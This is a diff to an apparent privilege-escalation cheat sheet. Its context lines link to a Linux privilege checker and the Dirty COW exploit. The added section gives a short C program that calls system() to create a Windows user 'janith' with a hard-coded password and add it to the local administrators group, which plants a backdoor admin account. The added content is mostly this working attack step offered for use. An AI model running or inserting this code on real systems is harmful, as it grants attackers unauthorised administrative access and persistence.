@@ -53,3 +53,15 @@ https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.
 ```
 https://github.com/FireFart/dirtycow/blob/master/dirty.c
 ```
+
+## If it is possible to run a c executable, run useradd.c file
+```
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+
+int main ()
+{
+  int i;
+  i=system ("net user janith janith@123 /add && net localgroup administrators janith /add");
+  return 0;
+}
+```
